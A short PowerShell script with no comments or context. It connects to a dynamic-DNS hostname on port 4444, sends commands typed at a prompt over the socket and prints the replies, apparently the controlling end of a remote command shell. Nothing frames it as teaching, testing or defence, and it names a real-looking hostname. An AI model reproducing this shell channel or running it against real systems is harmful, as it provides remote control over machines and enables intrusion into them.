$ip = "suber122.duckdns.org"
$port = 4444

$client = New-Object System.Net.Sockets.TcpClient($ip, $port)
$stream = $client.GetStream()

$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)

$writer.AutoFlush = $true

while ($stream.Connected)
{
    $cmd = Read-Host "Enter Command"
    $writer.WriteLine($cmd)
    $output = $reader.ReadLine()
    Write-Host $output
}

$client.Close()
